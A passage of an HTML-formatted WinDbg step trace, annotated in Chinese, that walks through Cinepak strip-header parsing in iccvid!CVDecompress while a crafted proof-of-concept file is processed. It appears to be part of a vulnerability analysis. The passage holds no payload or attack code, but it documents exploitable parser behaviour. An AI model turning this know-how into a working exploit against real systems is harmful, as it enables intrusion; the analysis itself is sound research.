class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x222</span>:</span><br><span class="line">73b723d0 8b45f8          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; eax = [ebp-8] = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x225</span>:</span><br><span class="line">73b723d3 0145f4          <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd24=00ba6912 <span class="comment">; [ebp-0Ch] = 0x00ba6912+0x10 = 0x00ba6922,指向第3个Strip Header，eax为Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x228</span>:</span><br><span class="line">73b723d6 2945f0          <span class="keyword">sub</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd20=0000004e <span class="comment">; [ebp-10h] = 3e,[ebp-10h]为未解压缩的数据长度，开始时等于PoC中cinepak_codec_data2和idx_tag字节数之和,这里算出剩余未解压缩的数据长度</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x22b</span>:</span><br><span class="line">73b723d9 03f0            <span class="keyword">add</span>     <span class="built_in">esi</span>,<span class="built_in">eax</span>                                        <span class="comment">; esi指向第2个Strip Header，eax为Size of strip data，这里移动数据指针,指向第3个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723db <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x22d</span>:</span><br><span class="line">73b723db 8b45e4          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1Ch</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd14=<span class="number">00000010</span> <span class="comment">; eax = [ebp-1Ch] = 0x10,Number of coded strips</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723de <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x230</span>:</span><br><span class="line">73b723de 3945ec          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">14h</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd1c=<span class="number">00000002</span> <span class="comment">; [ebp-14h]为coded strips计数器,eax为Number of coded strips</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723e1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x233</span>:</span><br><span class="line">73b723e1 8975e8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>],<span class="built_in">esi</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba691e <span class="comment">; [ebp-18h] = esi = 0x00ba6922,指向第3个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723e4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x236</span>:</span><br><span class="line">73b723e4 0f8c59feffff    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x95</span> (73b72243)     [br=<span class="number">1</span>] <span class="comment">; 小于则跳转，这里跳转</span></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72243 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x95</span>:</span><br><span class="line">73b72243 8b45f0          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd20=0000003e <span class="comment">; [ebp-10h]为剩余未解压缩的数据长度</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72246 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x98</span>:</span><br><span class="line">73b72246 83f816          <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">16h</span>                                        <span class="comment">; 判断未解压的数据长度是否小于0x16</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72249 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x9b</span>:</span><br><span class="line">73b72249 0f829b010000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7224f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa1</span>:</span><br><span class="line">73b7224f 0fb65603        <span class="keyword">movzx</span>   <span class="built_in">edx</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">3</span>]       <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6925=<span class="number">10</span> <span class="comment">; edx = 0x10,第3个Size of strip data的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72253 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa5</span>:</span><br><span class="line">73b72253 33c9            <span class="keyword">xor</span>     <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                        <span class="comment">; ecx = ecx^ecx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72255 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa7</span>:</span><br><span class="line">73b72255 8a6e01          <span class="keyword">mov</span>     <span class="number">ch</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6923=<span class="number">00</span> <span class="comment">; ch = 0x00,第3个Strip CVID ID的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72258 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xaa</span>:</span><br><span class="line">73b72258 8a4e02          <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">2</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6924=<span class="number">00</span> <span class="comment">; cl = 0x00,第3个Size of strip data的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7225b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xad</span>:</span><br><span class="line">73b7225b c1e108          <span class="keyword">shl</span>     <span class="built_in">ecx</span>,<span class="number">8</span>                                          <span class="comment">; ecx = 0x00000000,左移8位</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7225e <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb0</span>:</span><br><span class="line">73b7225e 0bca            <span class="keyword">or</span>      <span class="built_in">ecx</span>,<span class="built_in">edx</span>                                        <span class="comment">; 以大端读取Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72260 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb2</span>:</span><br><span class="line">73b72260 3bc1            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span>                                        <span class="comment">; 判断剩余未解压缩的数据长度是否大于Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72262 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb4</span>:</span><br><span class="line">73b72262 894df8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>],<span class="built_in">ecx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; [ebp-8] = ecx = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72265 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb7</span>:</span><br><span class="line">73b72265 0f827f010000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xbd</span>:</span><br><span class="line">73b7226b 8a06            <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]          <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6922=<span class="number">11</span> <span class="comment">; al = 0x11,Strip CVID ID的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226d <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xbf</span>:</span><br><span class="line">73b7226d 3c10            <span class="keyword">cmp</span>     <span class="built_in">al</span>,<span class="number">10h</span>                                         <span class="comment">; 判断Strip CVID ID的高位字节是否为0x10</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc1</span>:</span><br><span class="line">73b7226f <span class="number">7408</span>            <span class="keyword">je</span>      iccvid!CVDecompress+<span class="number">0xcb</span> (73b72279)     [br=<span class="number">0</span>] <span class="comment">; 相等则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72271 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span 